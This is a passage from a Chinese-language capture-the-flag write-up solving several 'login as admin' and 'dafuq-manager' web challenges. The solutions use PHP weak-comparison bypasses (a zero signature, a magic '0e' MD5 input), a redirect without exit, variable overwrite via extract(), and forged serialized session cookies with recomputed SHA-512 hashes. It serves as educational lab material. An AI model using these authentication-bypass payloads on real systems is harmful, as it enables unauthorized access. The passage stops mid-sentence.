class="keyword">if</span>(hash_hmac(<span class="string">'sha512'</span>, $unserialized[<span class="string">'data'</span>], $secret) != $unserialized[<span class="string">'sig'</span>]) &#123;</span><br><span class="line">        $error = <span class="string">'Invalid session'</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $data = json_decode($unserialized[<span class="string">'data'</span>], <span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">'name'</span> =&gt; $data[<span class="number">0</span>],</span><br><span class="line">        <span class="string">'admin'</span> =&gt; $data[<span class="number">1</span>]</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>setuser()</code>函数负责创建用户账号，但是若想创建用户账号我们首先需要通过输入已知的某个账户通过下列验证</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'name'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $user = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">foreach</span>($users <span class="keyword">as</span> $u) &#123;</span><br><span class="line">        <span class="keyword">if</span>($u[<span class="string">'name'</span>] === $_POST[<span class="string">'name'</span>] &amp;&amp; $u[<span class="string">'password'</span>] === $_POST[<span class="string">'password'</span>]) &#123;</span><br><span class="line">            set_user($u);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很好办，利用 guest 用户登录即可</p>
+<p>现在的关键点就是伪造 admin 用户的 cookie 并通过 cookie 的验证，在验证函数<code>loader_user()</code>中找到了一句关键代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$r = hash_hmac(<span class="string">'sha512'</span>, $unserialized[<span class="string">'data'</span>], $secret) != $unserialized[<span class="string">'sig'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(hash_hmac(<span class="string">'sha512'</span>, $unserialized[<span class="string">'data'</span>], $secret) != $unserialized[<span class="string">'sig'</span>]) &#123;</span><br><span class="line">        $error = <span class="string">'Invalid session'</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意这里使用的是<code>!=</code>来比较 sig 值而不是<code>!==</code>，因此我们可以通过<code>0==任意字符串</code>来绕过 cookie 验证</p>
+<p>我们在本地复现<code>set_user()</code>函数如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_user</span><span class="params">($user_data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $user, $secret;</span><br><span class="line"></span><br><span class="line">    $user = [<span class="string">'admin'</span>, <span class="keyword">true</span>];</span><br><span class="line"></span><br><span class="line">    $data = json_encode($user);</span><br><span class="line">    $sig = <span class="number">0</span>;</span><br><span class="line">    $all = base64_encode(json_encode([<span class="string">'sig'</span> =&gt; $sig, <span class="string">'data'</span> =&gt; $data]));</span><br><span class="line">    setcookie(<span class="string">'user'</span>, $all, time()+<span class="number">3600</span>);</span><br><span class="line">    <span class="keyword">echo</span> $all;</span><br><span class="line">&#125;</span><br><span class="line">set_user();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们构造了一个 admin 用户，构造其 sig 参数为 0，运行后获取伪造的可通过验证的 admin 用户的 cookie</p>
+<p><img src="/report_cybersecurity01_img/136.png" alt=""></p>
+<p>接下来返回登录界面，用户名密码均填写 guest，登陆后修改 cookie 为我们伪造的值</p>
+<p><code>eyJzaWciOjAsImRhdGEiOiJbXCJhZG1pblwiLHRydWVdIn0=</code></p>
+<p><img src="/report_cybersecurity01_img/137.png" alt=""></p>
+<p>得到 flag:<code>FLAG{H3110, 4dm1n1576a70r... 1f y0u kn0w my 53cR37 and Use STRONG COMPARE pls}</code></p>
+<h3 id="login-as-admin-4"><a href="#login-as-admin-4" class="headerlink" title="login as admin 4"></a>login as admin 4</h3><h4 id="描述-11"><a href="#描述-11" class="headerlink" title="描述"></a>描述</h4><p>login as admin</p>
+<h4 id="思路-11"><a href="#思路-11" class="headerlink" title="思路"></a>思路</h4><p>首先获取这道题的源码，截取关键部分如下</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'show_source'</span>] === <span class="string">'1'</span>) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'name'</span>] === <span class="string">'admin'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'password'</span>] !== $password) &#123;</span><br><span class="line">        <span class="comment">// show failed message if you input wrong password</span></span><br><span class="line">        header(<span class="string">'Location: ./?failed=1'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>($_GET[<span class="string">'failed'</span>] == <span class="string">'1'</span>): <span class="meta">?&gt;</span></span><br><span class="line">            &lt;div class="alert alert-danger"&gt;Login failed&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>($_POST[<span class="string">'name'</span>] === <span class="string">'admin'</span>): <span class="comment">/* login success! */</span> <span class="meta">?&gt;</span></span><br><span class="line">            &lt;div class="alert alert-success"&gt;&lt;code&gt;&lt;?=$flag?&gt;&lt;/code&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+
+<p>首先这里先对 post 上来的 name 参数与 password 参数进行了比对，若比对失败则利用 header 函数跳转到<code>./?failed=1</code>页面，跳转到这个页面会使 failed 参数通过 get 方法被设置成 1，故会显示 login failed</p>
+<p><img src="/report_cybersecurity01_img/139.png" alt=""></p>
+<p>看上去做的挺好的，但是其实有明显的逻辑错误，当 name 为 admin 的时候是能够直接登录的，并且这句代码被写到了<code>header()</code>函数之后，并且最致命的是在使用完重定向<code>header()</code>函数后没有使用<code>exit()</code>函数，导致虽然能够跳转到<code>./?failed=1</code>页面，但实际上本页面的 php 还会继续执行下去</p>
+<p>我们通过抓包 post:<code>name=admin&amp;password=admin</code>，直接可以剔除重定向页面，保留当前页面，从而得到当前页面返回的正确登录结果，最终得到 flag</p>
+<p><img src="/report_cybersecurity01_img/138.png" alt=""></p>
+<p>flag:<code>FLAG{Remember add exit after redirection..}</code></p>
+<h3 id="login-as-admin-6"><a href="#login-as-admin-6" class="headerlink" title="login as admin 6"></a>login as admin 6</h3><h4 id="描述-12"><a href="#描述-12" class="headerlink" title="描述"></a>描述</h4><p>login as admin</p>
+<h4 id="思路-12"><a href="#思路-12" class="headerlink" title="思路"></a>思路</h4><p>首先对源码进行分析，得到关键代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'data'</span>])) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $data = json_decode($_POST[<span class="string">'data'</span>], <span class="keyword">true</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        $data = [];</span><br><span class="line">    &#125;</span><br><span class="line">    extract($data);</span><br><span class="line">    <span class="keyword">if</span>($users[$username] &amp;&amp; strcmp($users[$username], $password) == <span class="number">0</span>) &#123;</span><br><span class="line">        $user = $username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>($user == <span class="string">'admin'</span>) printf(<span class="string">"&lt;code&gt;%s&lt;/code&gt;"</span>, htmlentities($flag)); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们需要明确的是，需要构造一个 json 格式的 data 参数来进行 post，若最终以 admin 身份登录成功，则获取到 flag</p>
+<p>当我们分析到<code>extract($data);</code>这一句代码时，顿时想到了变量覆盖，因为<code>extract()</code>会将我们 json 中构造的参数进行一一赋值，也就是说当我们伪造一个 data 数据使得 extract 函数将我们添加的用户 admin 覆盖掉之前后台预设的 admin 用户（用户名和密码都会被覆盖），然后在利用伪造的密码登录即可获取到 flag</p>
+<p>但是首先我们需要获取 guest 用户的 json 数据格式从而确定伪造的 data 内容，通过 guest 用户登录后，获取如下</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">"users"</span>: &#123; <span class="attr">"guest"</span>: <span class="string">"guest"</span> &#125;, <span class="attr">"username"</span>: <span class="string">"guest"</span>, <span class="attr">"password"</span>: <span class="string">"guest"</span> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>编写 php 脚本生成我们所伪造的 json 数据</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$array = [</span><br><span class="line">    <span class="string">'users'</span> =&gt; [admin =&gt; <span class="string">'passwd'</span>],</span><br><span class="line">    <span class="string">'username'</span> =&gt; <span class="string">'admin'</span>,</span><br><span class="line">    <span class="string">'password'</span> =&gt; <span class="string">'passwd'</span></span><br><span class="line">];</span><br><span class="line"><span class="keyword">echo</span> json_encode($array);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>生成如下</p>
+<p><img src="/report_cybersecurity01_img/140.png" alt=""></p>
+<p>得到伪造的 json 数据</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">"users"</span>: &#123; <span class="attr">"admin"</span>: <span class="string">"passwd"</span> &#125;, <span class="attr">"username"</span>: <span class="string">"admin"</span>, <span class="attr">"password"</span>: <span class="string">"passwd"</span> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>post 该数据，得到 flag</p>
+<p><img src="/report_cybersecurity01_img/141.png" alt=""></p>
+<p>flag:<code>FLAG{Oops, I fucked up your user database}</code></p>
+<h3 id="login-as-admin-7"><a href="#login-as-admin-7" class="headerlink" title="login as admin 7"></a>login as admin 7</h3><h4 id="描述-13"><a href="#描述-13" class="headerlink" title="描述"></a>描述</h4><p>login as admin</p>
+<h4 id="思路-13"><a href="#思路-13" class="headerlink" title="思路"></a>思路</h4><p>读取源码，找到关键代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'name'</span>] == <span class="string">'admin'</span> &amp;&amp; md5($_POST[<span class="string">'password'</span>]) == <span class="string">'00000000000000000000000000000000'</span>) &#123;</span><br><span class="line">    <span class="comment">// admin account is disabled by give a impossible md5 hash</span></span><br><span class="line">    $user = <span class="string">'admin'</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span>($_POST[<span class="string">'name'</span>] == <span class="string">'guest'</span> &amp;&amp; md5($_POST[<span class="string">'password'</span>]) == <span class="string">'084e0343a0486ff05530df6c705c8bb4'</span>) &#123;</span><br><span class="line">    $user = <span class="string">'guest'</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="keyword">isset</span>($_POST[<span class="string">'name'</span>])) &#123;</span><br><span class="line">    $user = <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于 php 会将<code>0e</code>开头的字符串识别为科学计数法，故<code>0e</code>开头的字符串将会被解析为<code>0</code>，然后代码中使用的<code>==</code>就是很经典的弱类型比较了，故我们只需找一个字符串通过 MD5 加密的结果为<code>0e</code>开头的即可，这里找到的是<code>QNKCDZO</code></p>
+<p><img src="/report_cybersecurity01_img/142.png" alt=""></p>
+<p>登录即可得到 flag</p>
+<p><img src="/report_cybersecurity01_img/143.png" alt=""></p>
+<p>flag:<code>FLAG{Scientific notation is awesome!!!}</code></p>
+<h3 id="login-as-admin-8"><a href="#login-as-admin-8" class="headerlink" title="login as admin 8"></a>login as admin 8</h3><h4 id="描述-14"><a href="#描述-14" class="headerlink" title="描述"></a>描述</h4><p>login as admin</p>
+<h4 id="思路-14"><a href="#思路-14" class="headerlink" title="思路"></a>思路</h4><p>根据给出的源码，找到关键代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// class Session &#123; ... &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// sorry, no source code this time. :P</span></span><br><span class="line"></span><br><span class="line">$session = Session::load();</span><br><span class="line">$login_failed = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'show_source'</span>] === <span class="string">'1'</span>) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'debug'</span>] === <span class="string">'1'</span>) &#123;</span><br><span class="line">    $session-&gt;debug();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'name'</span>])) &#123;</span><br><span class="line">    $login_failed = !Session::login($_POST[<span class="string">'name'</span>], $_POST[<span class="string">'password'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'logout'</span>])) &#123;</span><br><span class="line">    $session = <span class="keyword">new</span> Session();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$session-&gt;save();</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>($login_failed): <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span>     <span class="keyword">if</span>($_POST[<span class="string">'name'</span>] === <span class="string">'admin'</span>): <span class="meta">?&gt;</span></span><br><span class="line">            &lt;div class="alert alert-danger"&gt;Nice try. Login failed&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span>     <span class="keyword">else</span>: <span class="meta">?&gt;</span></span><br><span class="line">            &lt;div class="alert alert-danger"&gt;Login failed&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span>     <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">elseif</span>($session-&gt;is_admin): <span class="meta">?&gt;</span></span><br><span class="line">            &lt;div class="alert alert-success"&gt;Hello, admin! Here is your flag: &lt;code&gt;&lt;?=$flag?&gt;&lt;/code&gt;&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">elseif</span>($session-&gt;user): <span class="meta">?&gt;</span></span><br><span class="line">            &lt;div class="alert alert-info"&gt;Hello, &lt;?=$session-&gt;user?&gt;. You are not admin, no flag for you! :P&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码中的一个关键点就是要使<code>$session-&gt;is_admin</code>的值为<code>1</code>，从代码的总体上来来分析没有其他的突破口，故查看一下页面 cookie，发现了两个比较可疑的 cookie</p>
+<p><img src="/report_cybersecurity01_img/144.png" alt=""></p>
+<p><img src="/report_cybersecurity01_img/145.png" alt=""></p>
+<p><img src="/report_cybersecurity01_img/146.png" alt=""></p>
+<p>login8cookie 中存放着用户登录所需 json 数据的 url 编码，猜测 login8sha512 存储的是对 login8cookie 的 sha512 验证值，编写脚本验证一下我们的猜想</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">cookie=<span class="string">'''O%3A7%3A%22Session%22%3A6%3A%7Bs%3A14%3A%22%00Session%00debug%22%3Bb%3A0%3Bs%3A19%3A%22%00Session%00debug_dump%22%3Bs%3A9%3A%22index.php%22%3Bs%3A13%3A%22%00Session%00data%22%3Ba%3A0%3A%7B%7Ds%3A4%3A%22user%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22pass%22%3Bs%3A0%3A%22%22%3Bs%3A8%3A%22is_admin%22%3Bb%3A0%3B%7D'''</span></span><br><span class="line">cookie_decode = urllib.parse.unquote(cookie)</span><br><span class="line">print(cookie_decode)</span><br><span class="line"><span class="comment"># 'O:7:"Session":6:&#123;s:14:" Session debug";b:0;s:19:" Session debug_dump";s:9:"index.php";s:13:" Session data";a:0:&#123;&#125;s:4:"user";s:0:"";s:4:"pass";s:0:"";s:8:"is_admin";b:0;&#125;'</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">print(hashlib.sha512(cookie_decode.encode()).hexdigest())</span><br><span class="line"><span class="comment"># '4feb33685e47c83ce089b1707f270001a8dc0648d4a7d94d0a3e2f5b35803a7c8766285283415c8594e658468cf5e99be232b3bf98a441568a71f709243e9077'</span></span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下</p>
+<p><img src="/report_cybersecurity01_img/147.png" alt=""></p>
+<p>这就验证了我们的猜想</p>
+<p>然后我们对这个登录的 json 数据进行分析，发现了之前提到的验证函数<code>is_admin</code></p>
+<p>看到其对应的验证值 b 为 0，我们修改其为 1，伪造 cookie 及其对应的 sha512 值</p>
+<p>新的 cookie 很容易伪造</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A7%3A%22Session%22%3A6%3A%7Bs%3A14%3A%22%00Session%00debug%22%3Bb%3A0%3Bs%3A19%3A%22%00Session%00debug_dump%22%3Bs%3A9%3A%22index.php%22%3Bs%3A13%3A%22%00Session%00data%22%3Ba%3A0%3A%7B%7Ds%3A4%3A%22user%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22pass%22%3Bs%3A0%3A%22%22%3Bs%3A8%3A%22is_admin%22%3Bb%3A1%3B%7D</span><br></pre></td></tr></table></figure>
+
+<p>编写脚本获取其 sha512 验证值</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">print(hashlib.sha512(cookie_new.encode()).hexdigest())</span><br></pre></td></tr></table></figure>
+
+<p>获得 sha512 值为<code>1bfca86fbcfe7d9ece7d7566b160a7a351894d0420827db36f87021e8debf4b728cfd5accb8785d7e812f2774e5924adf0753edd9d53e7c2f161209028f28add</code></p>
+<p>刷新后得到 flag</p>
+<p><img src="/report_cybersecurity01_img/148.png" alt=""></p>
+<p>flag:<code>FLAG{object injection G____G}</code></p>
+<h3 id="login-as-admin-8-1"><a href="#login-as-admin-8-1" class="headerlink" title="login as admin 8.1"></a>login as admin 8.1</h3><h4 id="描述-15"><a href="#描述-15" class="headerlink" title="描述"></a>描述</h4><p>login as admin and grab the hidden flag</p>
+<h4 id="思路-15"><a href="#思路-15" class="headerlink" title="思路"></a>思路</h4><p>同上题一样，我们首先对 json 数据中的 debug 参数进行伪造，修改参数值为 1</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:"Session":6:&#123;s:14:" Session debug";b:1;s:19:" Session debug_dump";s:9:"index.php";s:13:" Session data";a:0:&#123;&#125;s:4:"user";s:0:"";s:4:"pass";s:0:"";s:8:"is_admin";b:1;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用脚本对其进行 sha512，得到值为</p>
+<p><code>c17531535c2cabe065820ccfa4d7c011ed511b0ab8e80ca7add98d6a64dabb750c4970376ae5ebd09c9636689fda305ea530d9b5297cefc9d4caf43a7e97f9d2</code></p>
+<p>把伪造的 cookie 进行替换，请求<code>?debug=1</code>得到源码</p>
+<p><img src="/report_cybersecurity01_img/149.png" alt=""></p>
+<p>然后我们再尝试修改<code>debug_dump</code>参数，将<code>s:9:&quot;index.php&quot;</code>修改为<code>s:10:&quot;config.php&quot;</code>，伪造 cookie 与 sha512 值，从而获取 config.php 页面源码</p>
+<p>伪造的 sha512 值为<code>b71ecad06a697e63acb904d9c3ae98870ddc0ce7c95ee834dcd83073ce662afc94c00c85084736b59e0c13c1a2bccac45fd70abe7b61e8476c5eeb890f9f5d96</code></p>
+<p>替换 cookie 后，在<code>config.php</code>源码中我们寻找到了 flag</p>
+<p><img src="/report_cybersecurity01_img/150.png" alt=""></p>
+<p>flag:<code>FLAG{wake up neo}</code></p>
+<h3 id="dafuq-manager-1"><a href="#dafuq-manager-1" class="headerlink" title="dafuq-manager 1"></a>dafuq-manager 1</h3><h4 id="描述-16"><a href="#描述-16" class="headerlink" title="描述"></a>描述</h4><p>Login as guest and find flag 1</p>
+<h4 id="思路-16"><a href="#思路-16" class="headerlink" title="思路"></a>思路</h4><p>题目给出了 guest 账号供我们登录，我们先登录上去看看</p>
+<p><img src="/report_cybersecurity01_img/151.png" alt=""></p>
+<p>有一个含有提示的 txt 文件，打开以后告诉我们要新建一个 cookie:<code>help=me</code></p>
+<p><img src="/report_cybersecurity01_img/152.png" alt=""></p>
+<p>同时我们也要修改<code>show_hidden</code>的值为 yes</p>
+<p><img src="/report_cybersecurity01_img/153.png" alt=""></p>
+<p>刷新页面后，出现 flag 文件，打开后获得 flag</p>
+<p><img src="/report_cybersecurity01_img/154.png" alt=""></p>
+<p>flag:<code>FLAG{Wow, how did you found me? I was hidden!}</code></p>
+<h3 id="dafuq-manager-2"><a href="#dafuq-manager-2" class="headerlink" title="dafuq-manager 2"></a>dafuq-manager 2</h3><h4 id="描述-17"><a href="#描述-17" class="headerlink" title="描述"></a>描述</h4><p>Login as admin, code review and get flag 2</p>
+<h4 id="思路-17"><a href="#思路-17" class="headerlink" title="思路"></a>思路</h4><p>没有啥思路，只好尝试想方法以 admin 身份登录，我们先把该网页的源码压缩包下下来，审计一下它的源码</p>
+<p>先检查它的<code>index.php</code>，看到了这么一段代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">"admin"</span>:</span><br><span class="line">        <span class="keyword">require</span> <span class="string">"./core/fun_admin.php"</span>;</span><br><span class="line">        show_admin($GLOBALS[<span class="string">"dir"</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>找到<code>show_admin</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_admin</span><span class="params">($dir)</span> </span>&#123;</span><br><span class="line">    $pwd = (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">2</span>) == <span class="number">2</span>);</span><br><span class="line">    $admin = (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">4</span>) == <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span> (!$GLOBALS[<span class="string">"require_login"</span>]) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"miscnofunc"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($GLOBALS[<span class="string">'__GET'</span>][<span class="string">"action2"</span>])) $action2 = $GLOBALS[<span class="string">'__GET'</span>][<span class="string">"action2"</span>];</span><br><span class="line">    <span class="keyword">elseif</span> (<span class="keyword">isset</span>($GLOBALS[<span class="string">'__POST'</span>][<span class="string">"action2"</span>])) $action2 = $GLOBALS[<span class="string">'__POST'</span>][<span class="string">"action2"</span>];</span><br><span class="line">    <span class="keyword">else</span> $action2 = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">switch</span> ($action2) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"chpwd"</span>:</span><br><span class="line">            <span class="keyword">if</span> (!$pwd) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">            changepwd($dir);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"adduser"</span>:</span><br><span class="line">            <span class="keyword">if</span> (!$admin) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">            adduser($dir);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"edituser"</span>:</span><br><span class="line">            <span class="keyword">if</span> (!$admin) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">            edituser($dir);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"rmuser"</span>:</span><br><span class="line">            <span class="keyword">if</span> (!$admin) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">            removeuser($dir);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">if</span> (!$pwd &amp;&amp; !$admin) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">            admin($admin, $dir);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>在这个函数中发现，若想以 admin 身份登录，则必须满足</p>
